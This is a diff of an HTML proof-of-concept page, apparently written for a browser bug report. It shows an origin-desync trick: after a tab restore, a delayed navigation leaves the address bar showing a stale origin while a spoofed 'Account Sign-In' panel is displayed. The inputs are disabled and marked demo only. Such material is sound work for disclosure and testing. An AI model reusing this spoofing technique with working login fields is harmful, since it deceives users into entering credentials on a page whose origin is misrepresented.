@@ -1,34 +1,119 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Origin Desync Login PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+}
+
+button {
+  margin:40px;
+  font-size:18px;
+  padding:10px 18px;
+}
+
+#panel {
+  display:none;
+  max-width:420px;
+  margin:80px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
+
+label {
+  display:block;
+  font-size:14px;
+  margin-top:12px;
+}
+
+input {
+  width:100%;
+  padding:10px;
+  font-size:16px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  margin-top:6px;
+}
+
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+}
+
+.login {
+  margin-top:20px;
+  width:100%;
+  padding:12px;
+  font-size:16px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+}
+</style>
+</head>
+
+<body>
+
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Account Sign‑In</h2>
+  <div class="sub">Session verification required</div>
+
+  <label>Email</label>
+  <input type="email" placeholder="user@example.com" disabled>
+
+  <label>Password</label>
+  <input type="password" placeholder="••••••••" disabled>
+
+  <button class="login" onclick="demoOnly()">Sign in</button>
+
+  <div class="notice">
+    Demo only — inputs are disabled, no data is collected.
+  </div>
+</div>
+
 <script>
 const panel = document.getElementById('panel');
-const originLabel = document.getElementById('origin');
-const startBtn = document.getElementById('start');
+const trigger = document.getElementById('trigger');
 
-let armed = false;
+function demoOnly() {
+  alert(
+    'Demo only:\nUser could attempt login while address bar shows stale origin.'
+  );
+}
 
-startBtn.onclick = () => {
+trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
-  originLabel.textContent = location.origin;
-  armed = true;
 };
 
-/*
- Firefox iOS:
- tab overview return = pageshow + persisted
-*/
+// trigger navigation AFTER tab restore
 window.addEventListener('pageshow', (e) => {
-  if (!armed) return;
-
-  // update visible content immediately
-  originLabel.textContent = location.origin;
-
-  // DELAYED NAVIGATION (critical)
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'http://google.com:9000';
+        location.href = 'http://GOOGLE.com:9000';
       }, 80);
     });
   });
 });
 </script>
+
+</body>
+</html>
